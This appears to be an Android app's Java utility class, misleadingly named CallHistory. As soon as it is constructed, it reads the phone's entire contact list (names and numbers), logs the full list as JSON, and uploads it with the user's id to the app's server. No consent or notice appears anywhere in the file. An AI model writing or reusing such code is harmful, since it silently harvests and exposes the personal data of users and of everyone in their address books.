package com.kb260.gxdk.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import com.google.gson.Gson;
import com.kb260.gxdk.R;
import com.kb260.gxdk.api.Api;
import com.kb260.gxdk.api.RxHelper;
import com.kb260.gxdk.api.RxSubscriber;
import com.kb260.gxdk.app.KBApplication;
import com.kb260.gxdk.view.base.WebViewActivity;
import com.orhanobut.logger.Logger;
import com.umeng.socialize.ShareAction;
import com.umeng.socialize.bean.SHARE_MEDIA;
import com.umeng.socialize.media.UMImage;
import com.umeng.socialize.media.UMWeb;

import org.json.JSONException;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * @author KB260
 *         Created on  2017/12/12
 */

public class CallHistory {
    ContentResolver contentResolver;
    List<String> contactIds;
    List<String> phones;
    Context context;

    public CallHistory(Context context){
        this.context = context;
        contentResolver = context.getContentResolver();
        contactIds = new ArrayList<>();
        phones = new ArrayList<>();
        //initContacts();
        try {
            readContacts();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    //获取手机联系人
    private void initContacts() {
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, new String[]{"_id"}, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            if (cursor.moveToFirst()) {
                do {
                    int contactIdIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);//获取 id 所在列的索引
                    String contactId = cursor.getString(contactIdIndex);//联系人id
                    contactIds.add(contactId);
                } while (cursor.moveToNext());
                cursor.close();
            }
        }
        for (String contactId:contactIds){
            //联系人电话信息
            logData(contentResolver,contactId);
        }
        for (String a : phones){
            Logger.d(a);
        }
        /*int size = phones.size();
        if (size>0){
            *//*int a = size/10;
            int b = size%10;
            for (int i =0;i<a;i++){
                requestPhones = phones.subList(0,10);
                addFriend();
            }
            if (b>0){
                requestPhones = phones;
                addFriend();
            }*//*

            if (phones.size()>10){
                requestPhones = phones.subList(0,10).toString();
            }else {
                requestPhones = phones.toString();
            }
            addFriend();
        }*/
    }

    //此方法可以打印所有字段的详细信息
    private void logData(final ContentResolver contentResolver, String contactId) {
        Cursor dataCursor = contentResolver.query(ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + "=?",
                new String[]{String.valueOf(contactId)}, null);
        if (dataCursor != null) {
            if (dataCursor.getCount() > 0) {
                if (dataCursor.moveToFirst()) {
                    final int columnIndex = dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    String phoneNumber = dataCursor.getString(columnIndex);
                    //得到纯数字电话号码
                    if (phoneNumber.startsWith("+86")) {
                        phoneNumber = phoneNumber.replace("+86", "");
                    }
                    phoneNumber = phoneNumber.replace(" ", "");
                    phoneNumber = phoneNumber.replace("-", "");
                    if (phoneNumber.length()==11){
                        if (RegexUtils.isMobileSimple(phoneNumber)){
                            phones.add(phoneNumber);
                        }
                    }
                }
            }
            dataCursor.close();
        }
    }

    private void readContacts() throws JSONException {
        // 首先，从raw_contacts中读取联系人的id（"contact_id")
        // 其次，根据contact_id从data表中查询出相应的电话号码和联系人名称
        // 然后，根据mimetype来区分哪个是联系人，哪个是电话号码
        // Uri rawContactsUri = Uri
        // .parse("content://com.android.contacts/raw_contacts");

        List<HashMap<String, String>> contacts = new ArrayList<>();

        // 从raw_contacts中读取联系人的id("contact_id")
        Cursor rawContactsCursor = contentResolver.query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[] { "contact_id", "sort_key" }, null, null,
                "sort_key");    //按sort_key排序

        if (rawContactsCursor != null) {
            while (rawContactsCursor.moveToNext()) {
                String contactId = rawContactsCursor.getString(0);
                // System.out.println(contactId);
                if (contactId != null) {
                    // 曾经有过，已经删除的联系人在raw_contacts表中记录仍在，但contact_id值为null
                    // 根据contact_id从data表中查询出相应的电话号码和联系人名称
                    // Uri dataUri = Uri
                    // .parse("content://com.android.contacts/data");
                    Cursor dataCursor = contentResolver.query(
                            ContactsContract.Data.CONTENT_URI,
                            new String[] { "data1", "mimetype" },
                            "contact_id=?", new String[] { contactId }, null);

                    if (dataCursor != null) {
                        HashMap<String, String> map = new HashMap<String, String>();

                        while (dataCursor.moveToNext()) {
                            String data1 = dataCursor.getString(0);
                            String mimetype = dataCursor.getString(1);

                            if ("vnd.android.cursor.item/phone_v2"
                                    .equals(mimetype)){
                                map.put("phone", data1);
                            }
                            else if ("vnd.android.cursor.item/name"
                                    .equals(mimetype)){
                                map.put("name", data1);
                            }
                        }
                        contacts.add(map);
                    }
                    if (dataCursor != null) {
                        dataCursor.close();
                    }
                }
            }
            Gson gson = new Gson();
            String json=gson.toJson(contacts);
            Logger.e("json="+json);
            rawContactsCursor.close();
            telphone(json);
        }
    }

    private void telphone(String tel){
        Api.getDefault().telphone(KBApplication.userid,tel)
                .compose(RxHelper.handleResult())
                .subscribe(new RxSubscriber<String>(context) {
                    @Override
                    protected void success(String list) {
                        Logger.d("tel:success");
                    }

                    @Override
                    protected void error(String msg) {
                        Logger.d(msg);
                    }
                });
    }
}
